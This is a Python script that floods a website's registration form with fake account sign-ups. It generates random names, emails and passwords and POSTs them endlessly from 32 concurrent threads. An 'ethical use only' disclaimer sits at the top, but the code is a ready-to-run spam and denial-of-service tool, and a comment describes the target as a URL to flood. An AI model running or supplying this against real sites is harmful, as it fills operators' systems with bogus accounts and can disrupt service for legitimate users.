# IMPORTANT : USE THIS APP ONLY FOR ETHICAL REASONS
# OR TO TEST YOUR OWN WEB APP IF IT'S VULNERABLE
# have fun

# IMPORTS
import requests
from faker import Faker
import threading
import random
import string

#INITIALIZE FAKER
fake = Faker()

#INITIALIZE ATTEMPTS VARIABLE
tries = 0

# adjust according to your needs
# by default it is set to generate random word, then add few random letters
# then to lower it all with .lower()
# email, username and password is randomly generated by Faker
# remember to set max password length !!!

def generate_random_data():
    random_letters = ''.join(random.choices(string.ascii_letters, k=3))
    name = fake.word()+random_letters.lower()
    email = fake.email()
    password = fake.password(length=10)
    return name, email, password

def send_post_form(url, data):
    try:
        response = requests.post(url, data=data)
        print("Response:", response.text)
    except Exception as e:
        print("An error occurred:", str(e))

# IMPORTANT PART !!!
# ADJUST form_data fields to your needs !
# if you don't know what to type here
# just fill the registration form and
# look what's being sent in POST
# by checking Developer's console
# in your browser

# ALSO : app runs in while True mode, you have to stop
# it manually = ))))

def send_requests_in_threads(url):
    while True:
        name, email, password = generate_random_data()
        form_data = {
            "post1": "1",
            "name": name,
            "countries": "se",
            "email": email,
            "password": password,
            "password2": password,
            "accept": "1"
        }

        send_post_form(url, form_data)
        global tries
        tries += 1

        print("Generated data:")
        print("Name:", name)
        print("Email:", email)
        print("Password:", password)
        print("Account create attempts : ", tries)

# by default app runs in 32 threads
# change it below if you need to

if __name__ == "__main__":
    url = "REPLACE_ME"  # Replace this with the malicious URL to flood the registration form

    threads = []
    for _ in range(32):
        t = threading.Thread(target=send_requests_in_threads, args=(url,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()
